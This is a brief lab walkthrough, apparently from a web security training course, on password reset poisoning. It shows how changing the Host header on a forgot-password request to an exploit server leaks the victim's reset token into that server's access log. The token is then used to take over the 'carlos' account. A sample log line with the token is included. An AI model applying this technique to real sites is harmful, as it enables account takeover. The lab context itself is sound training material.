# Lab: Basic password reset poisoning

Forgot password -> Enter username = carlos -> Capture the request in burp -> Go to exploit server -> Copy the exploit url (exploit-[id].exploit-server.net/exploit) -> In burp, Change the Host to exploit-[id].exploit-server.net/exploit -> Send -> Go to exploit server - access log -> You will get the token:
```
"GET /exploit/forgot-password?temp-forgot-password-token=y8ntm0p7fd4v2o8lo6tsak86op8eavx7
```
Go to `https://[id].web-security-academy.net//forgot-password?temp-forgot-password-token=y8ntm0p7fd4v2o8lo6tsak86op8eavx7` and then you can enter a new password -> then login as carlos

